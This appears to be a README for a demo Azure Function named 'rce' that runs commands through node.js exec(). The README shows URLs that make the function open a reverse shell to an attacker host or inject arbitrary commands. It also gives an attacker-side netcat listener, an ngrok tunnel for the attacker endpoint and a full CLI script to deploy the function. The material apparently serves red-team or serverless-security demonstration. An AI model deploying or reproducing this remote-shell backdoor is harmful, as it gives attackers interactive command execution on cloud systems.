

# Dead simple reverse shell example

Usss node.js exec() for reverseShell lolbins present at Azure Functions, (bash could be also used, but I had one of the lolbins ready from previous example)

[``/rce/index.js``](/rce/index.js)


// Examples https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


## Usage



        shell = host or fqdn
        port = portNmbr
        https://fn-reverseshell-26735.azurewebsites.net/api/rce?code={functionKey}&shell=contosoReverseShell.io&port=14577 

        or to just inject 
        https://fn-rshell-15002.azurewebsites.net/api/rce?code=={functionKey}&inject=id

## Listener example
    at attacker side aka. contosoReverseShell.io
        nc -l 4444 -vvv



**Ngrok can also be used to publish the attacker endpoint**

The use of NGROK was previosly demonstrated here
 https://github.com/pumasecurity/serverless-prey/tree/main/cougar 

---

## Deploy with AZ CLI
```sh
#az login --use-device-code
#az account set --subscription 78020cde-0dd8-4ac6-a6d4-21bac00fb343
#Define starting variables
rnd=15002
fnName=fn-rShell-$rnd
rg=RG-FN-$rnd
location=westeurope
# You can ignore the warning "command substitution: ignored null byte in input"
storageAcc=storage$(shuf -zer -n10  {a..z})

# Create Resource Group (retention tag is just example, based on another service)
az group create -n $rg \
-l $location \

# Create storageAcc Account 
saId=$(az storage account create -n $storageAcc  -g $rg --kind storageV2 -l $location -t Account --sku Standard_LRS  -o tsv --query "id")
saConstring=$(az storage account show-connection-string -g $rg  -n  $storageAcc -o tsv --query "connectionString")

## Create Function App
az functionapp create \
--functions-version 3 \
--consumption-plan-location $location \
--name $fnName \
--os-type linux \
--resource-group $rg \
--runtime node \
--storage-account $storageAcc
#
sleep 10

# Set to read-only, list variables here you want to be also part of cloud deployment
az functionapp config appsettings set \
--name $fnName \
--resource-group $rg \
--settings WEBSITE_RUN_FROM_PACKAGE=1 

#Create ZIP package 

7z a -tzip deploy.zip . -r -mx0 -xr\!*.git -xr\!*.vscode 
az functionapp deployment source config-zip -g $rg -n $fnName --src deploy.zip

keys=$(az functionapp keys list -g $rg -n $fnName -o tsv --query functionKeys) 
msiFn=$(az functionapp function show -g $rg -n $fnName --function-name rce -o tsv --query invokeUrlTemplate)
echo "$msiFn"?code="$keys"

#
rm deploy.zip

nc -l 4444 -vvv
# IF ngrok is used ( run this on agent )
ngrok tcp 4444
```